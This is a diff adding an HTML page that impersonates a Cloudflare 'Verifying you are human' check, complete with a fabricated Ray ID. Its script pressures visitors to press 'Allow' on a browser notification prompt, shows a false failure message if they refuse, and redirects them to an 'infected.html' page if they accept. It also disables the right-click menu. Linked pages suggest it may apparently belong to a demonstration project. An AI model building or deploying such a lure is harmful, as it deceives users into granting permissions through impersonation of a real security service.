@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Check</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      text-align: center;
+      max-width: 400px;
+      padding: 20px;
+    }
+    .cf-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+    .cf-logo svg { width: 28px; height: 28px; }
+    .cf-logo span {
+      font-size: 14px;
+      color: #555;
+      font-weight: 500;
+    }
+    .cf-box {
+      background: #fff;
+      border: 1px solid #e0e0e0;
+      border-radius: 10px;
+      padding: 28px 24px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+    }
+    .cf-spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid #e0e0e0;
+      border-top-color: #f48120;
+      border-radius: 50%;
+      margin: 0 auto 16px;
+      animation: spin 0.8s linear infinite;
+    }
+    .cf-spinner.done {
+      animation: none;
+      border-color: #2ecc40;
+      border-top-color: #2ecc40;
+      position: relative;
+    }
+    .cf-spinner.done::after {
+      content: "✓";
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #2ecc40;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .cf-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 4px;
+    }
+    .cf-sub {
+      font-size: 13px;
+      color: #888;
+      line-height: 1.4;
+    }
+    .cf-step2 {
+      display: none;
+      margin-top: 16px;
+      padding-top: 16px;
+      border-top: 1px solid #eee;
+    }
+    .cf-step2 p {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 8px;
+    }
+    .cf-step2 .arrow {
+      font-size: 28px;
+      animation: bounce 0.8s infinite;
+      display: inline-block;
+      color: #f48120;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); }
+    }
+    .cf-footer {
+      margin-top: 16px;
+      font-size: 11px;
+      color: #bbb;
+    }
+    .cf-footer a { color: #aaa; text-decoration: none; }
+    .ray-id {
+      font-family: monospace;
+      font-size: 10px;
+      color: #ccc;
+      margin-top: 12px;
+    }
+    .fail-msg {
+      display: none;
+      color: #e74c3c;
+      font-size: 13px;
+      margin-top: 12px;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="cf-logo">
+      <svg viewBox="0 0 64 64" fill="none">
+        <circle cx="32" cy="32" r="30" stroke="#f48120" stroke-width="4"/>
+        <path d="M20 32l8 8 16-16" stroke="#f48120" stroke-width="4" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <span>Checking your browser</span>
+    </div>
+
+    <div class="cf-box">
+      <div class="cf-spinner" id="spinner"></div>
+      <div class="cf-title" id="title">Verifying you are human</div>
+      <div class="cf-sub" id="subtitle">This may take a few seconds...</div>
+
+      <div class="cf-step2" id="step2">
+        <p>One more step — press <b>"Allow"</b> to verify</p>
+        <div class="arrow">⬆</div>
+      </div>
+      <div class="fail-msg" id="failMsg">Verification failed. Allow notifications to complete the check.</div>
+    </div>
+
+    <div class="cf-footer">
+      Performance & security by <a>Cloudflare</a>
+    </div>
+    <div class="ray-id" id="rayId">Ray ID: —</div>
+  </div>
+
+  <script>
+    document.getElementById("rayId").textContent = "Ray ID: " +
+      Array.from({length:16}, () => "0123456789abcdef"[Math.floor(Math.random()*16)]).join("");
+
+    setTimeout(() => {
+      document.getElementById("spinner").classList.add("done");
+      document.getElementById("title").textContent = "Almost there...";
+      document.getElementById("subtitle").textContent = "Additional verification required";
+      document.getElementById("step2").style.display = "block";
+
+      Notification.requestPermission().then(p => {
+        if (p === "granted") {
+          document.getElementById("step2").style.display = "none";
+          document.getElementById("title").textContent = "Verification complete";
+          document.getElementById("subtitle").textContent = "Redirecting...";
+          new Notification("Security check passed", {
+            body: "Your browser has been verified. You may continue.",
+          });
+          setTimeout(() => {
+            location.href = "/tetapux/pages/infected.html";
+          }, 1500);
+        } else {
+          document.getElementById("step2").style.display = "none";
+          document.getElementById("failMsg").style.display = "block";
+          document.getElementById("spinner").classList.remove("done");
+          document.getElementById("title").textContent = "Verification failed";
+          document.getElementById("subtitle").textContent = "";
+        }
+      });
+    }, 2500);
+
+    document.addEventListener("contextmenu", e => e.preventDefault());
+  </script>
+  <script src="/tetapux/disclaimer.js" async></script>
+</body>
+</html>
